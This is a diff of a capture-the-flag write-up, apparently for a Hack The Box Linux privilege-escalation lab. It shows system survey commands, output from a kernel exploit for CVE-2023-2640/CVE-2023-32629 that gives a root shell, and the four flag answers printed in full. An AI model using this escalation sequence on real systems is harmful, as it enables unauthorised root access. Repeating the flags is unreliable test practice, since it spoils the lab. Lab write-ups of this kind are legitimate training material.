@@ -5,7 +5,7 @@ We've ben hired to evaluate the security of an INLANEFREIGHT public servers.
 We've been given access to a low privileged account and the goal of escalating our privileges so that we can get the 5 flags.
 
 
-## Flag1.txt
+## Privilege Escalation
 Login and survey:
 
     htb-student@nix03:~$cat /etc/os-release
@@ -24,14 +24,6 @@ Login and survey:
 
     htb-student@nix03:~$ cat /proc/version 
     Linux version 5.4.0-45-generic (buildd@lgw01-amd64-033) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020
-
-Find other flags:
-
-    htb-student@nix03:~$ find / 2>/dev/null -name flag?.txt -exec ls -l {} \;
-    -rwx------ 1 barry barry 29 Sep  5  2020 /home/barry/flag2.txt
-    -rw-r----- 1 root adm 23 Sep  5  2020 /var/log/flag3.txt
-    -rw------- 1 tomcat tomcat 25 Sep  5  2020 /var/lib/tomcat9/flag4.txt
-
 
 
 Look up known CVEs for this Linux version and kernel:
@@ -68,6 +60,32 @@ Escalate Privileges:
     [+] Type 'exit' to finish and leave the house cleaned
     root@nix03:~/CVE-2023-2640-CVE-2023-32629# id
     uid=0(root) gid=1002(htb-student) groups=1002(htb-student)
-    root@nix03:~/CVE-2023-2640-CVE-2023-32629# cat /root/flag5.txt
+
+
+## Get the flags:
+
+Find the flags:
+
+    root@nix03:~# find / 2>/dev/null -name flag?.txt -exec ls -l {} \;
+    -rwx------ 1 barry barry 29 Sep  5  2020 /home/barry/flag2.txt
+    -rw-r----- 1 root adm 23 Sep  5  2020 /var/log/flag3.txt
+    -rw------- 1 tomcat tomcat 25 Sep  5  2020 /var/lib/tomcat9/flag4.txt
+    -rw-r--r-- 1 root root 35 Sep  5  2020 /root/flag5.txt
+
+Read the files:
+    
+    root@nix03:~# cat /home/barry/flag2.txt
+    LLPE{ch3ck_th0se_cmd_l1nes!}
+    
+    root@nix03:~# cat /var/log/flag3.txt
+    LLPE{h3y_l00k_a_fl@g!}
+    
+    root@nix03:~# cat /var/lib/tomcat9/flag4.txt
+    LLPE{im_th3_m@nag3r_n0w}
+
+    root@nix03:~# cat /root/flag5.txt
     LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
+
+
+
 
